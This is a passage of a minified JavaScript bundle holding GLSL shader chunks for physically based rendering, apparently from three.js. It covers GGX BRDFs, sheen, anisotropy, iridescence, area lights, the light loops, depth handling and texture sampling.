	material.sheenRoughness = clamp( sheenRoughness, 0.0001, 1.0 );
	#ifdef USE_SHEEN_ROUGHNESSMAP
		material.sheenRoughness *= texture2D( sheenRoughnessMap, vSheenRoughnessMapUv ).a;
	#endif
#endif
#ifdef USE_ANISOTROPY
	#ifdef USE_ANISOTROPYMAP
		mat2 anisotropyMat = mat2( anisotropyVector.x, anisotropyVector.y, - anisotropyVector.y, anisotropyVector.x );
		vec3 anisotropyPolar = texture2D( anisotropyMap, vAnisotropyMapUv ).rgb;
		vec2 anisotropyV = anisotropyMat * normalize( 2.0 * anisotropyPolar.rg - vec2( 1.0 ) ) * anisotropyPolar.b;
	#else
		vec2 anisotropyV = anisotropyVector;
	#endif
	material.anisotropy = length( anisotropyV );
	if( material.anisotropy == 0.0 ) {
		anisotropyV = vec2( 1.0, 0.0 );
	} else {
		anisotropyV /= material.anisotropy;
		material.anisotropy = saturate( material.anisotropy );
	}
	material.alphaT = mix( pow2( material.roughness ), 1.0, pow2( material.anisotropy ) );
	material.anisotropyT = tbn[ 0 ] * anisotropyV.x + tbn[ 1 ] * anisotropyV.y;
	material.anisotropyB = tbn[ 1 ] * anisotropyV.x - tbn[ 0 ] * anisotropyV.y;
#endif`,nM=`uniform sampler2D dfgLUT;
struct PhysicalMaterial {
	vec3 diffuseColor;
	vec3 diffuseContribution;
	vec3 specularColor;
	vec3 specularColorBlended;
	float roughness;
	float metalness;
	float specularF90;
	float dispersion;
	#ifdef USE_CLEARCOAT
		float clearcoat;
		float clearcoatRoughness;
		vec3 clearcoatF0;
		float clearcoatF90;
	#endif
	#ifdef USE_IRIDESCENCE
		float iridescence;
		float iridescenceIOR;
		float iridescenceThickness;
		vec3 iridescenceFresnel;
		vec3 iridescenceF0;
		vec3 iridescenceFresnelDielectric;
		vec3 iridescenceFresnelMetallic;
	#endif
	#ifdef USE_SHEEN
		vec3 sheenColor;
		float sheenRoughness;
	#endif
	#ifdef IOR
		float ior;
	#endif
	#ifdef USE_TRANSMISSION
		float transmission;
		float transmissionAlpha;
		float thickness;
		float attenuationDistance;
		vec3 attenuationColor;
	#endif
	#ifdef USE_ANISOTROPY
		float anisotropy;
		float alphaT;
		vec3 anisotropyT;
		vec3 anisotropyB;
	#endif
};
vec3 clearcoatSpecularDirect = vec3( 0.0 );
vec3 clearcoatSpecularIndirect = vec3( 0.0 );
vec3 sheenSpecularDirect = vec3( 0.0 );
vec3 sheenSpecularIndirect = vec3(0.0 );
vec3 Schlick_to_F0( const in vec3 f, const in float f90, const in float dotVH ) {
    float x = clamp( 1.0 - dotVH, 0.0, 1.0 );
    float x2 = x * x;
    float x5 = clamp( x * x2 * x2, 0.0, 0.9999 );
    return ( f - vec3( f90 ) * x5 ) / ( 1.0 - x5 );
}
float V_GGX_SmithCorrelated( const in float alpha, const in float dotNL, const in float dotNV ) {
	float a2 = pow2( alpha );
	float gv = dotNL * sqrt( a2 + ( 1.0 - a2 ) * pow2( dotNV ) );
	float gl = dotNV * sqrt( a2 + ( 1.0 - a2 ) * pow2( dotNL ) );
	return 0.5 / max( gv + gl, EPSILON );
}
float D_GGX( const in float alpha, const in float dotNH ) {
	float a2 = pow2( alpha );
	float denom = pow2( dotNH ) * ( a2 - 1.0 ) + 1.0;
	return RECIPROCAL_PI * a2 / pow2( denom );
}
#ifdef USE_ANISOTROPY
	float V_GGX_SmithCorrelated_Anisotropic( const in float alphaT, const in float alphaB, const in float dotTV, const in float dotBV, const in float dotTL, const in float dotBL, const in float dotNV, const in float dotNL ) {
		float gv = dotNL * length( vec3( alphaT * dotTV, alphaB * dotBV, dotNV ) );
		float gl = dotNV * length( vec3( alphaT * dotTL, alphaB * dotBL, dotNL ) );
		float v = 0.5 / ( gv + gl );
		return v;
	}
	float D_GGX_Anisotropic( const in float alphaT, const in float alphaB, const in float dotNH, const in float dotTH, const in float dotBH ) {
		float a2 = alphaT * alphaB;
		highp vec3 v = vec3( alphaB * dotTH, alphaT * dotBH, a2 * dotNH );
		highp float v2 = dot( v, v );
		float w2 = a2 / v2;
		return RECIPROCAL_PI * a2 * pow2 ( w2 );
	}
#endif
#ifdef USE_CLEARCOAT
	vec3 BRDF_GGX_Clearcoat( const in vec3 lightDir, const in vec3 viewDir, const in vec3 normal, const in PhysicalMaterial material) {
		vec3 f0 = material.clearcoatF0;
		float f90 = material.clearcoatF90;
		float roughness = material.clearcoatRoughness;
		float alpha = pow2( roughness );
		vec3 halfDir = normalize( lightDir + viewDir );
		float dotNL = saturate( dot( normal, lightDir ) );
		float dotNV = saturate( dot( normal, viewDir ) );
		float dotNH = saturate( dot( normal, halfDir ) );
		float dotVH = saturate( dot( viewDir, halfDir ) );
		vec3 F = F_Schlick( f0, f90, dotVH );
		float V = V_GGX_SmithCorrelated( alpha, dotNL, dotNV );
		float D = D_GGX( alpha, dotNH );
		return F * ( V * D );
	}
#endif
vec3 BRDF_GGX( const in vec3 lightDir, const in vec3 viewDir, const in vec3 normal, const in PhysicalMaterial material ) {
	vec3 f0 = material.specularColorBlended;
	float f90 = material.specularF90;
	float roughness = material.roughness;
	float alpha = pow2( roughness );
	vec3 halfDir = normalize( lightDir + viewDir );
	float dotNL = saturate( dot( normal, lightDir ) );
	float dotNV = saturate( dot( normal, viewDir ) );
	float dotNH = saturate( dot( normal, halfDir ) );
	float dotVH = saturate( dot( viewDir, halfDir ) );
	vec3 F = F_Schlick( f0, f90, dotVH );
	#ifdef USE_IRIDESCENCE
		F = mix( F, material.iridescenceFresnel, material.iridescence );
	#endif
	#ifdef USE_ANISOTROPY
		float dotTL = dot( material.anisotropyT, lightDir );
		float dotTV = dot( material.anisotropyT, viewDir );
		float dotTH = dot( material.anisotropyT, halfDir );
		float dotBL = dot( material.anisotropyB, lightDir );
		float dotBV = dot( material.anisotropyB, viewDir );
		float dotBH = dot( material.anisotropyB, halfDir );
		float V = V_GGX_SmithCorrelated_Anisotropic( material.alphaT, alpha, dotTV, dotBV, dotTL, dotBL, dotNV, dotNL );
		float D = D_GGX_Anisotropic( material.alphaT, alpha, dotNH, dotTH, dotBH );
	#else
		float V = V_GGX_SmithCorrelated( alpha, dotNL, dotNV );
		float D = D_GGX( alpha, dotNH );
	#endif
	return F * ( V * D );
}
vec2 LTC_Uv( const in vec3 N, const in vec3 V, const in float roughness ) {
	const float LUT_SIZE = 64.0;
	const float LUT_SCALE = ( LUT_SIZE - 1.0 ) / LUT_SIZE;
	const float LUT_BIAS = 0.5 / LUT_SIZE;
	float dotNV = saturate( dot( N, V ) );
	vec2 uv = vec2( roughness, sqrt( 1.0 - dotNV ) );
	uv = uv * LUT_SCALE + LUT_BIAS;
	return uv;
}
float LTC_ClippedSphereFormFactor( const in vec3 f ) {
	float l = length( f );
	return max( ( l * l + f.z ) / ( l + 1.0 ), 0.0 );
}
vec3 LTC_EdgeVectorFormFactor( const in vec3 v1, const in vec3 v2 ) {
	float x = dot( v1, v2 );
	float y = abs( x );
	float a = 0.8543985 + ( 0.4965155 + 0.0145206 * y ) * y;
	float b = 3.4175940 + ( 4.1616724 + y ) * y;
	float v = a / b;
	float theta_sintheta = ( x > 0.0 ) ? v : 0.5 * inversesqrt( max( 1.0 - x * x, 1e-7 ) ) - v;
	return cross( v1, v2 ) * theta_sintheta;
}
vec3 LTC_Evaluate( const in vec3 N, const in vec3 V, const in vec3 P, const in mat3 mInv, const in vec3 rectCoords[ 4 ] ) {
	vec3 v1 = rectCoords[ 1 ] - rectCoords[ 0 ];
	vec3 v2 = rectCoords[ 3 ] - rectCoords[ 0 ];
	vec3 lightNormal = cross( v1, v2 );
	if( dot( lightNormal, P - rectCoords[ 0 ] ) < 0.0 ) return vec3( 0.0 );
	vec3 T1, T2;
	T1 = normalize( V - N * dot( V, N ) );
	T2 = - cross( N, T1 );
	mat3 mat = mInv * transpose( mat3( T1, T2, N ) );
	vec3 coords[ 4 ];
	coords[ 0 ] = mat * ( rectCoords[ 0 ] - P );
	coords[ 1 ] = mat * ( rectCoords[ 1 ] - P );
	coords[ 2 ] = mat * ( rectCoords[ 2 ] - P );
	coords[ 3 ] = mat * ( rectCoords[ 3 ] - P );
	coords[ 0 ] = normalize( coords[ 0 ] );
	coords[ 1 ] = normalize( coords[ 1 ] );
	coords[ 2 ] = normalize( coords[ 2 ] );
	coords[ 3 ] = normalize( coords[ 3 ] );
	vec3 vectorFormFactor = vec3( 0.0 );
	vectorFormFactor += LTC_EdgeVectorFormFactor( coords[ 0 ], coords[ 1 ] );
	vectorFormFactor += LTC_EdgeVectorFormFactor( coords[ 1 ], coords[ 2 ] );
	vectorFormFactor += LTC_EdgeVectorFormFactor( coords[ 2 ], coords[ 3 ] );
	vectorFormFactor += LTC_EdgeVectorFormFactor( coords[ 3 ], coords[ 0 ] );
	float result = LTC_ClippedSphereFormFactor( vectorFormFactor );
	return vec3( result );
}
#if defined( USE_SHEEN )
float D_Charlie( float roughness, float dotNH ) {
	float alpha = pow2( roughness );
	float invAlpha = 1.0 / alpha;
	float cos2h = dotNH * dotNH;
	float sin2h = max( 1.0 - cos2h, 0.0078125 );
	return ( 2.0 + invAlpha ) * pow( sin2h, invAlpha * 0.5 ) / ( 2.0 * PI );
}
float V_Neubelt( float dotNV, float dotNL ) {
	return saturate( 1.0 / ( 4.0 * ( dotNL + dotNV - dotNL * dotNV ) ) );
}
vec3 BRDF_Sheen( const in vec3 lightDir, const in vec3 viewDir, const in vec3 normal, vec3 sheenColor, const in float sheenRoughness ) {
	vec3 halfDir = normalize( lightDir + viewDir );
	float dotNL = saturate( dot( normal, lightDir ) );
	float dotNV = saturate( dot( normal, viewDir ) );
	float dotNH = saturate( dot( normal, halfDir ) );
	float D = D_Charlie( sheenRoughness, dotNH );
	float V = V_Neubelt( dotNV, dotNL );
	return sheenColor * ( D * V );
}
#endif
float IBLSheenBRDF( const in vec3 normal, const in vec3 viewDir, const in float roughness ) {
	float dotNV = saturate( dot( normal, viewDir ) );
	float r2 = roughness * roughness;
	float rInv = 1.0 / ( roughness + 0.1 );
	float a = -1.9362 + 1.0678 * roughness + 0.4573 * r2 - 0.8469 * rInv;
	float b = -0.6014 + 0.5538 * roughness - 0.4670 * r2 - 0.1255 * rInv;
	float DG = exp( a * dotNV + b );
	return saturate( DG );
}
vec3 EnvironmentBRDF( const in vec3 normal, const in vec3 viewDir, const in vec3 specularColor, const in float specularF90, const in float roughness ) {
	float dotNV = saturate( dot( normal, viewDir ) );
	vec2 fab = texture2D( dfgLUT, vec2( roughness, dotNV ) ).rg;
	return specularColor * fab.x + specularF90 * fab.y;
}
#ifdef USE_IRIDESCENCE
void computeMultiscatteringIridescence( const in vec3 normal, const in vec3 viewDir, const in vec3 specularColor, const in float specularF90, const in float iridescence, const in vec3 iridescenceF0, const in float roughness, inout vec3 singleScatter, inout vec3 multiScatter ) {
#else
void computeMultiscattering( const in vec3 normal, const in vec3 viewDir, const in vec3 specularColor, const in float specularF90, const in float roughness, inout vec3 singleScatter, inout vec3 multiScatter ) {
#endif
	float dotNV = saturate( dot( normal, viewDir ) );
	vec2 fab = texture2D( dfgLUT, vec2( roughness, dotNV ) ).rg;
	#ifdef USE_IRIDESCENCE
		vec3 Fr = mix( specularColor, iridescenceF0, iridescence );
	#else
		vec3 Fr = specularColor;
	#endif
	vec3 FssEss = Fr * fab.x + specularF90 * fab.y;
	float Ess = fab.x + fab.y;
	float Ems = 1.0 - Ess;
	vec3 Favg = Fr + ( 1.0 - Fr ) * 0.047619;	vec3 Fms = FssEss * Favg / ( 1.0 - Ems * Favg );
	singleScatter += FssEss;
	multiScatter += Fms * Ems;
}
vec3 BRDF_GGX_Multiscatter( const in vec3 lightDir, const in vec3 viewDir, const in vec3 normal, const in PhysicalMaterial material ) {
	vec3 singleScatter = BRDF_GGX( lightDir, viewDir, normal, material );
	float dotNL = saturate( dot( normal, lightDir ) );
	float dotNV = saturate( dot( normal, viewDir ) );
	vec2 dfgV = texture2D( dfgLUT, vec2( material.roughness, dotNV ) ).rg;
	vec2 dfgL = texture2D( dfgLUT, vec2( material.roughness, dotNL ) ).rg;
	vec3 FssEss_V = material.specularColorBlended * dfgV.x + material.specularF90 * dfgV.y;
	vec3 FssEss_L = material.specularColorBlended * dfgL.x + material.specularF90 * dfgL.y;
	float Ess_V = dfgV.x + dfgV.y;
	float Ess_L = dfgL.x + dfgL.y;
	float Ems_V = 1.0 - Ess_V;
	float Ems_L = 1.0 - Ess_L;
	vec3 Favg = material.specularColorBlended + ( 1.0 - material.specularColorBlended ) * 0.047619;
	vec3 Fms = FssEss_V * FssEss_L * Favg / ( 1.0 - Ems_V * Ems_L * Favg + EPSILON );
	float compensationFactor = Ems_V * Ems_L;
	vec3 multiScatter = Fms * compensationFactor;
	return singleScatter + multiScatter;
}
#if NUM_RECT_AREA_LIGHTS > 0
	void RE_Direct_RectArea_Physical( const in RectAreaLight rectAreaLight, const in vec3 geometryPosition, const in vec3 geometryNormal, const in vec3 geometryViewDir, const in vec3 geometryClearcoatNormal, const in PhysicalMaterial material, inout ReflectedLight reflectedLight ) {
		vec3 normal = geometryNormal;
		vec3 viewDir = geometryViewDir;
		vec3 position = geometryPosition;
		vec3 lightPos = rectAreaLight.position;
		vec3 halfWidth = rectAreaLight.halfWidth;
		vec3 halfHeight = rectAreaLight.halfHeight;
		vec3 lightColor = rectAreaLight.color;
		float roughness = material.roughness;
		vec3 rectCoords[ 4 ];
		rectCoords[ 0 ] = lightPos + halfWidth - halfHeight;		rectCoords[ 1 ] = lightPos - halfWidth - halfHeight;
		rectCoords[ 2 ] = lightPos - halfWidth + halfHeight;
		rectCoords[ 3 ] = lightPos + halfWidth + halfHeight;
		vec2 uv = LTC_Uv( normal, viewDir, roughness );
		vec4 t1 = texture2D( ltc_1, uv );
		vec4 t2 = texture2D( ltc_2, uv );
		mat3 mInv = mat3(
			vec3( t1.x, 0, t1.y ),
			vec3(    0, 1,    0 ),
			vec3( t1.z, 0, t1.w )
		);
		vec3 fresnel = ( material.specularColorBlended * t2.x + ( vec3( 1.0 ) - material.specularColorBlended ) * t2.y );
		reflectedLight.directSpecular += lightColor * fresnel * LTC_Evaluate( normal, viewDir, position, mInv, rectCoords );
		reflectedLight.directDiffuse += lightColor * material.diffuseContribution * LTC_Evaluate( normal, viewDir, position, mat3( 1.0 ), rectCoords );
	}
#endif
void RE_Direct_Physical( const in IncidentLight directLight, const in vec3 geometryPosition, const in vec3 geometryNormal, const in vec3 geometryViewDir, const in vec3 geometryClearcoatNormal, const in PhysicalMaterial material, inout ReflectedLight reflectedLight ) {
	float dotNL = saturate( dot( geometryNormal, directLight.direction ) );
	vec3 irradiance = dotNL * directLight.color;
	#ifdef USE_CLEARCOAT
		float dotNLcc = saturate( dot( geometryClearcoatNormal, directLight.direction ) );
		vec3 ccIrradiance = dotNLcc * directLight.color;
		clearcoatSpecularDirect += ccIrradiance * BRDF_GGX_Clearcoat( directLight.direction, geometryViewDir, geometryClearcoatNormal, material );
	#endif
	#ifdef USE_SHEEN
 
 		sheenSpecularDirect += irradiance * BRDF_Sheen( directLight.direction, geometryViewDir, geometryNormal, material.sheenColor, material.sheenRoughness );
 
 		float sheenAlbedoV = IBLSheenBRDF( geometryNormal, geometryViewDir, material.sheenRoughness );
 		float sheenAlbedoL = IBLSheenBRDF( geometryNormal, directLight.direction, material.sheenRoughness );
 
 		float sheenEnergyComp = 1.0 - max3( material.sheenColor ) * max( sheenAlbedoV, sheenAlbedoL );
 
 		irradiance *= sheenEnergyComp;
 
 	#endif
	reflectedLight.directSpecular += irradiance * BRDF_GGX_Multiscatter( directLight.direction, geometryViewDir, geometryNormal, material );
	reflectedLight.directDiffuse += irradiance * BRDF_Lambert( material.diffuseContribution );
}
void RE_IndirectDiffuse_Physical( const in vec3 irradiance, const in vec3 geometryPosition, const in vec3 geometryNormal, const in vec3 geometryViewDir, const in vec3 geometryClearcoatNormal, const in PhysicalMaterial material, inout ReflectedLight reflectedLight ) {
	vec3 diffuse = irradiance * BRDF_Lambert( material.diffuseContribution );
	#ifdef USE_SHEEN
		float sheenAlbedo = IBLSheenBRDF( geometryNormal, geometryViewDir, material.sheenRoughness );
		float sheenEnergyComp = 1.0 - max3( material.sheenColor ) * sheenAlbedo;
		diffuse *= sheenEnergyComp;
	#endif
	reflectedLight.indirectDiffuse += diffuse;
}
void RE_IndirectSpecular_Physical( const in vec3 radiance, const in vec3 irradiance, const in vec3 clearcoatRadiance, const in vec3 geometryPosition, const in vec3 geometryNormal, const in vec3 geometryViewDir, const in vec3 geometryClearcoatNormal, const in PhysicalMaterial material, inout ReflectedLight reflectedLight) {
	#ifdef USE_CLEARCOAT
		clearcoatSpecularIndirect += clearcoatRadiance * EnvironmentBRDF( geometryClearcoatNormal, geometryViewDir, material.clearcoatF0, material.clearcoatF90, material.clearcoatRoughness );
	#endif
	#ifdef USE_SHEEN
		sheenSpecularIndirect += irradiance * material.sheenColor * IBLSheenBRDF( geometryNormal, geometryViewDir, material.sheenRoughness ) * RECIPROCAL_PI;
 	#endif
	vec3 singleScatteringDielectric = vec3( 0.0 );
	vec3 multiScatteringDielectric = vec3( 0.0 );
	vec3 singleScatteringMetallic = vec3( 0.0 );
	vec3 multiScatteringMetallic = vec3( 0.0 );
	#ifdef USE_IRIDESCENCE
		computeMultiscatteringIridescence( geometryNormal, geometryViewDir, material.specularColor, material.specularF90, material.iridescence, material.iridescenceFresnelDielectric, material.roughness, singleScatteringDielectric, multiScatteringDielectric );
		computeMultiscatteringIridescence( geometryNormal, geometryViewDir, material.diffuseColor, material.specularF90, material.iridescence, material.iridescenceFresnelMetallic, material.roughness, singleScatteringMetallic, multiScatteringMetallic );
	#else
		computeMultiscattering( geometryNormal, geometryViewDir, material.specularColor, material.specularF90, material.roughness, singleScatteringDielectric, multiScatteringDielectric );
		computeMultiscattering( geometryNormal, geometryViewDir, material.diffuseColor, material.specularF90, material.roughness, singleScatteringMetallic, multiScatteringMetallic );
	#endif
	vec3 singleScattering = mix( singleScatteringDielectric, singleScatteringMetallic, material.metalness );
	vec3 multiScattering = mix( multiScatteringDielectric, multiScatteringMetallic, material.metalness );
	vec3 totalScatteringDielectric = singleScatteringDielectric + multiScatteringDielectric;
	vec3 diffuse = material.diffuseContribution * ( 1.0 - totalScatteringDielectric );
	vec3 cosineWeightedIrradiance = irradiance * RECIPROCAL_PI;
	vec3 indirectSpecular = radiance * singleScattering;
	indirectSpecular += multiScattering * cosineWeightedIrradiance;
	vec3 indirectDiffuse = diffuse * cosineWeightedIrradiance;
	#ifdef USE_SHEEN
		float sheenAlbedo = IBLSheenBRDF( geometryNormal, geometryViewDir, material.sheenRoughness );
		float sheenEnergyComp = 1.0 - max3( material.sheenColor ) * sheenAlbedo;
		indirectSpecular *= sheenEnergyComp;
		indirectDiffuse *= sheenEnergyComp;
	#endif
	reflectedLight.indirectSpecular += indirectSpecular;
	reflectedLight.indirectDiffuse += indirectDiffuse;
}
#define RE_Direct				RE_Direct_Physical
#define RE_Direct_RectArea		RE_Direct_RectArea_Physical
#define RE_IndirectDiffuse		RE_IndirectDiffuse_Physical
#define RE_IndirectSpecular		RE_IndirectSpecular_Physical
float computeSpecularOcclusion( const in float dotNV, const in float ambientOcclusion, const in float roughness ) {
	return saturate( pow( dotNV + ambientOcclusion, exp2( - 16.0 * roughness - 1.0 ) ) - 1.0 + ambientOcclusion );
}`,iM=`
vec3 geometryPosition = - vViewPosition;
vec3 geometryNormal = normal;
vec3 geometryViewDir = ( isOrthographic ) ? vec3( 0, 0, 1 ) : normalize( vViewPosition );
vec3 geometryClearcoatNormal = vec3( 0.0 );
#ifdef USE_CLEARCOAT
	geometryClearcoatNormal = clearcoatNormal;
#endif
#ifdef USE_IRIDESCENCE
	float dotNVi = saturate( dot( normal, geometryViewDir ) );
	if ( material.iridescenceThickness == 0.0 ) {
		material.iridescence = 0.0;
	} else {
		material.iridescence = saturate( material.iridescence );
	}
	if ( material.iridescence > 0.0 ) {
		material.iridescenceFresnelDielectric = evalIridescence( 1.0, material.iridescenceIOR, dotNVi, material.iridescenceThickness, material.specularColor );
		material.iridescenceFresnelMetallic = evalIridescence( 1.0, material.iridescenceIOR, dotNVi, material.iridescenceThickness, material.diffuseColor );
		material.iridescenceFresnel = mix( material.iridescenceFresnelDielectric, material.iridescenceFresnelMetallic, material.metalness );
		material.iridescenceF0 = Schlick_to_F0( material.iridescenceFresnel, 1.0, dotNVi );
	}
#endif
IncidentLight directLight;
#if ( NUM_POINT_LIGHTS > 0 ) && defined( RE_Direct )
	PointLight pointLight;
	#if defined( USE_SHADOWMAP ) && NUM_POINT_LIGHT_SHADOWS > 0
	PointLightShadow pointLightShadow;
	#endif
	#pragma unroll_loop_start
	for ( int i = 0; i < NUM_POINT_LIGHTS; i ++ ) {
		pointLight = pointLights[ i ];
		getPointLightInfo( pointLight, geometryPosition, directLight );
		#if defined( USE_SHADOWMAP ) && ( UNROLLED_LOOP_INDEX < NUM_POINT_LIGHT_SHADOWS ) && ( defined( SHADOWMAP_TYPE_PCF ) || defined( SHADOWMAP_TYPE_BASIC ) )
		pointLightShadow = pointLightShadows[ i ];
		directLight.color *= ( directLight.visible && receiveShadow ) ? getPointShadow( pointShadowMap[ i ], pointLightShadow.shadowMapSize, pointLightShadow.shadowIntensity, pointLightShadow.shadowBias, pointLightShadow.shadowRadius, vPointShadowCoord[ i ], pointLightShadow.shadowCameraNear, pointLightShadow.shadowCameraFar ) : 1.0;
		#endif
		RE_Direct( directLight, geometryPosition, geometryNormal, geometryViewDir, geometryClearcoatNormal, material, reflectedLight );
	}
	#pragma unroll_loop_end
#endif
#if ( NUM_SPOT_LIGHTS > 0 ) && defined( RE_Direct )
	SpotLight spotLight;
	vec4 spotColor;
	vec3 spotLightCoord;
	bool inSpotLightMap;
	#if defined( USE_SHADOWMAP ) && NUM_SPOT_LIGHT_SHADOWS > 0
	SpotLightShadow spotLightShadow;
	#endif
	#pragma unroll_loop_start
	for ( int i = 0; i < NUM_SPOT_LIGHTS; i ++ ) {
		spotLight = spotLights[ i ];
		getSpotLightInfo( spotLight, geometryPosition, directLight );
		#if ( UNROLLED_LOOP_INDEX < NUM_SPOT_LIGHT_SHADOWS_WITH_MAPS )
		#define SPOT_LIGHT_MAP_INDEX UNROLLED_LOOP_INDEX
		#elif ( UNROLLED_LOOP_INDEX < NUM_SPOT_LIGHT_SHADOWS )
		#define SPOT_LIGHT_MAP_INDEX NUM_SPOT_LIGHT_MAPS
		#else
		#define SPOT_LIGHT_MAP_INDEX ( UNROLLED_LOOP_INDEX - NUM_SPOT_LIGHT_SHADOWS + NUM_SPOT_LIGHT_SHADOWS_WITH_MAPS )
		#endif
		#if ( SPOT_LIGHT_MAP_INDEX < NUM_SPOT_LIGHT_MAPS )
			spotLightCoord = vSpotLightCoord[ i ].xyz / vSpotLightCoord[ i ].w;
			inSpotLightMap = all( lessThan( abs( spotLightCoord * 2. - 1. ), vec3( 1.0 ) ) );
			spotColor = texture2D( spotLightMap[ SPOT_LIGHT_MAP_INDEX ], spotLightCoord.xy );
			directLight.color = inSpotLightMap ? directLight.color * spotColor.rgb : directLight.color;
		#endif
		#undef SPOT_LIGHT_MAP_INDEX
		#if defined( USE_SHADOWMAP ) && ( UNROLLED_LOOP_INDEX < NUM_SPOT_LIGHT_SHADOWS )
		spotLightShadow = spotLightShadows[ i ];
		directLight.color *= ( directLight.visible && receiveShadow ) ? getShadow( spotShadowMap[ i ], spotLightShadow.shadowMapSize, spotLightShadow.shadowIntensity, spotLightShadow.shadowBias, spotLightShadow.shadowRadius, vSpotLightCoord[ i ] ) : 1.0;
		#endif
		RE_Direct( directLight, geometryPosition, geometryNormal, geometryViewDir, geometryClearcoatNormal, material, reflectedLight );
	}
	#pragma unroll_loop_end
#endif
#if ( NUM_DIR_LIGHTS > 0 ) && defined( RE_Direct )
	DirectionalLight directionalLight;
	#if defined( USE_SHADOWMAP ) && NUM_DIR_LIGHT_SHADOWS > 0
	DirectionalLightShadow directionalLightShadow;
	#endif
	#pragma unroll_loop_start
	for ( int i = 0; i < NUM_DIR_LIGHTS; i ++ ) {
		directionalLight = directionalLights[ i ];
		getDirectionalLightInfo( directionalLight, directLight );
		#if defined( USE_SHADOWMAP ) && ( UNROLLED_LOOP_INDEX < NUM_DIR_LIGHT_SHADOWS )
		directionalLightShadow = directionalLightShadows[ i ];
		directLight.color *= ( directLight.visible && receiveShadow ) ? getShadow( directionalShadowMap[ i ], directionalLightShadow.shadowMapSize, directionalLightShadow.shadowIntensity, directionalLightShadow.shadowBias, directionalLightShadow.shadowRadius, vDirectionalShadowCoord[ i ] ) : 1.0;
		#endif
		RE_Direct( directLight, geometryPosition, geometryNormal, geometryViewDir, geometryClearcoatNormal, material, reflectedLight );
	}
	#pragma unroll_loop_end
#endif
#if ( NUM_RECT_AREA_LIGHTS > 0 ) && defined( RE_Direct_RectArea )
	RectAreaLight rectAreaLight;
	#pragma unroll_loop_start
	for ( int i = 0; i < NUM_RECT_AREA_LIGHTS; i ++ ) {
		rectAreaLight = rectAreaLights[ i ];
		RE_Direct_RectArea( rectAreaLight, geometryPosition, geometryNormal, geometryViewDir, geometryClearcoatNormal, material, reflectedLight );
	}
	#pragma unroll_loop_end
#endif
#if defined( RE_IndirectDiffuse )
	vec3 iblIrradiance = vec3( 0.0 );
	vec3 irradiance = getAmbientLightIrradiance( ambientLightColor );
	#if defined( USE_LIGHT_PROBES )
		irradiance += getLightProbeIrradiance( lightProbe, geometryNormal );
	#endif
	#if ( NUM_HEMI_LIGHTS > 0 )
		#pragma unroll_loop_start
		for ( int i = 0; i < NUM_HEMI_LIGHTS; i ++ ) {
			irradiance += getHemisphereLightIrradiance( hemisphereLights[ i ], geometryNormal );
		}
		#pragma unroll_loop_end
	#endif
#endif
#if defined( RE_IndirectSpecular )
	vec3 radiance = vec3( 0.0 );
	vec3 clearcoatRadiance = vec3( 0.0 );
#endif`,sM=`#if defined( RE_IndirectDiffuse )
	#ifdef USE_LIGHTMAP
		vec4 lightMapTexel = texture2D( lightMap, vLightMapUv );
		vec3 lightMapIrradiance = lightMapTexel.rgb * lightMapIntensity;
		irradiance += lightMapIrradiance;
	#endif
	#if defined( USE_ENVMAP ) && defined( STANDARD ) && defined( ENVMAP_TYPE_CUBE_UV )
		iblIrradiance += getIBLIrradiance( geometryNormal );
	#endif
#endif
#if defined( USE_ENVMAP ) && defined( RE_IndirectSpecular )
	#ifdef USE_ANISOTROPY
		radiance += getIBLAnisotropyRadiance( geometryViewDir, geometryNormal, material.roughness, material.anisotropyB, material.anisotropy );
	#else
		radiance += getIBLRadiance( geometryViewDir, geometryNormal, material.roughness );
	#endif
	#ifdef USE_CLEARCOAT
		clearcoatRadiance += getIBLRadiance( geometryViewDir, geometryClearcoatNormal, material.clearcoatRoughness );
	#endif
#endif`,rM=`#if defined( RE_IndirectDiffuse )
	RE_IndirectDiffuse( irradiance, geometryPosition, geometryNormal, geometryViewDir, geometryClearcoatNormal, material, reflectedLight );
#endif
#if defined( RE_IndirectSpecular )
	RE_IndirectSpecular( radiance, iblIrradiance, clearcoatRadiance, geometryPosition, geometryNormal, geometryViewDir, geometryClearcoatNormal, material, reflectedLight );
#endif`,aM=`#if defined( USE_LOGARITHMIC_DEPTH_BUFFER )
	gl_FragDepth = vIsPerspective == 0.0 ? gl_FragCoord.z : log2( vFragDepth ) * logDepthBufFC * 0.5;
#endif`,oM=`#if defined( USE_LOGARITHMIC_DEPTH_BUFFER )
	uniform float logDepthBufFC;
	varying float vFragDepth;
	varying float vIsPerspective;
#endif`,lM=`#ifdef USE_LOGARITHMIC_DEPTH_BUFFER
	varying float vFragDepth;
	varying float vIsPerspective;
#endif`,cM=`#ifdef USE_LOGARITHMIC_DEPTH_BUFFER
	vFragDepth = 1.0 + gl_Position.w;
	vIsPerspective = float( isPerspectiveMatrix( projectionMatrix ) );
#endif`,uM=`#ifdef USE_MAP
	vec4 sampledDiffuseColor = texture2D( map, vMapUv );
	#ifdef DECODE_VIDEO_TEXTURE
		sampledDiffuseColor = sRGBTransferEOTF( sampledDiffuseColor );
	#endif
	diffuseColor *= sampledDiffuseColor;
#endif`,dM=`#ifdef USE_MAP
	uniform sampler2D map;
#endif`,pM=`#if defined( USE_MAP ) || defined( USE_ALPHAMAP )
	#if defined( USE_POINTS_UV )
		vec2 uv = vUv;
	#else
		vec2 uv = ( uvTransform * vec3( gl_PointCoord.x, 1.0 - gl_PointCoord.y, 1 ) ).xy;
	#endif
#endif
#ifdef USE_MAP
	diffuseColor *= texture2D( map, uv );
#endif
#ifdef USE_ALPHAMAP
	diffuseColor.a *= texture2D( alphaMap, uv ).g;
#endif`,hM=`#if defined( USE_POINTS_UV )
	varying vec2 vUv;
#else
	#if defined( USE_MAP ) || defined( USE_ALPHAMAP )
		uniform mat3 uvTransform;
	#endif
#endif
#ifdef USE_MAP
	uniform sampler2D map;
#endif
#ifdef USE_ALPHAMAP
	uniform sampler2D alphaMap;
#endif`,fM=`float metalnessFactor = metalness;
#ifdef USE_METALNESSMAP
	vec4 texelMetalness = texture2D( metalnessMap, vMetalnessMapUv );
	metalnessFactor *= texelMetalness.b;
#endif`,mM=`#ifdef USE_METALNESSMAP
	uniform sampler2D metalnessMap;
#endif`,gM=`#ifdef USE_INSTANCING_MORPH
	float morphTargetInfluences[ MORPHTARGETS_COUNT ];
	float morphTargetBaseInfluence = texelFetch( morphTexture, ivec2( 0, gl_InstanceID ), 0 ).r;
	for ( int i = 0; i < MORPHTARGETS_COUNT; i ++ ) {
		morphTargetInfluences[i] =  texelFetch( morphTexture, ivec2( i + 1, gl_InstanceID ), 0 ).r;
	}
#endif`,vM=`#if defined( USE_MORPHCOLORS )
	vColor *= morphTargetBaseInfluence;
